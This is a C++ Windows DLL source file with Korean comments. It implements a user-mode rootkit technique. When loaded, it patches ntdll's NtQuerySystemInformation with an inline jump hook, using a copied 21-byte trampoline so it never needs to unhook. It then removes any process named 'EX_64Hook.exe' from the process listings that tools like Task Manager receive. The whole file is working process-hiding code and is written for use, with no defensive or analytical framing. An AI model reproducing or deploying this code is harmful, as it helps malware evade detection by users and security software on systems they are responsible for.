#include "pch.h"
#include <windows.h>
#include <winternl.h>

// 1. 구조체 정의
typedef struct _SYSTEM_PROCESS_INFO_FINAL {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    BYTE Reserved1[48];
    UNICODE_STRING ImageName;
} SYSTEM_PROCESS_INFO_FINAL;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

// --- 전역 변수 ---
PNtQuerySystemInformation g_pTrampoline = nullptr;
void* g_pfTarget = nullptr;
const wchar_t* G_TARGET_NAME = L"EX_64Hook.exe";

// --- 트램펄린 설치 (원본 복귀 없는 21바이트 방식) ---
void install_no_return_hook(void* target, void* hookFunc) {
    // WinDbg 분석 결과: 2270(시작) ~ 2284(ret)까지 정확히 21바이트
    const int copySize = 21;

    // 1. 트램펄린 메모리 할당
    g_pTrampoline = (PNtQuerySystemInformation)VirtualAlloc(NULL, 128, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!g_pTrampoline) return;

    // 2. 원본 ntdll의 실행 코드 21바이트를 통째로 트램펄린에 복사
    // 여기에는 syscall과 ret이 포함되어 있어 원본으로 돌아갈 필요가 없음
    memcpy(g_pTrampoline, target, copySize);

    // 3. 원본 함수 패치 (절대 Unhook 하지 않음)
    DWORD old;
    VirtualProtect(target, 16, PAGE_EXECUTE_READWRITE, &old);

    BYTE patch[12] = { 0x48, 0xB8 }; // MOV RAX, [Addr]
    memcpy(&patch[2], &hookFunc, 8);
    patch[10] = 0xFF; patch[11] = 0xE0; // JMP RAX

    memset(target, 0x90, 16); // 16바이트 지점까지 NOP으로 밀어버림 (test 명령어 파편 제거)
    memcpy(target, patch, 12); // JMP 설치

    VirtualProtect(target, 16, old, &old);
}

// --- 훅 함수 (은폐 로직) ---
NTSTATUS WINAPI myNtQuerySystemInformation(ULONG Class, PVOID Info, ULONG Len, PULONG RetLen) {
    // [중요] Unhook을 하지 않고, syscall이 포함된 트램펄린을 직접 호출!
    NTSTATUS status = g_pTrampoline(Class, Info, Len, RetLen); // myNtQuerySystemInformation 내부에서 손상되지 않은 NtQuerySystemInformation을 직접 호출함. 

    if (status == 0 && Class == 5 && Info != NULL) {
        auto* pCurr = (SYSTEM_PROCESS_INFO_FINAL*)Info;
        SYSTEM_PROCESS_INFO_FINAL* pPrev = nullptr;

        while (pCurr) {
            bool bHide = false;
            if (pCurr->ImageName.Buffer != NULL) {
                if (wcsstr(pCurr->ImageName.Buffer, G_TARGET_NAME) != NULL) {
                    bHide = true;
                }
            }

            if (bHide) {
                if (pPrev) {
                    if (pCurr->NextEntryOffset == 0) pPrev->NextEntryOffset = 0;
                    else pPrev->NextEntryOffset += pCurr->NextEntryOffset;
                }
                else {
                    // 첫 번째 노드 은폐: 이름 길이를 0으로 하고 ID를 무효화
                    pCurr->ImageName.Length = 0;
                }
            }
            else {
                pPrev = pCurr;
            }

            if (pCurr->NextEntryOffset == 0) break;
            pCurr = (SYSTEM_PROCESS_INFO_FINAL*)((PBYTE)pCurr + pCurr->NextEntryOffset);
        }
    }
    return status;
}

// --- DLL 메인 ---
BOOL APIENTRY DllMain(HMODULE hM, DWORD r, LPVOID res) {
    if (r == DLL_PROCESS_ATTACH) {
        g_pfTarget = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (g_pfTarget) {
            install_no_return_hook(g_pfTarget, (void*)myNtQuerySystemInformation);
        }
    }
    return TRUE;
}
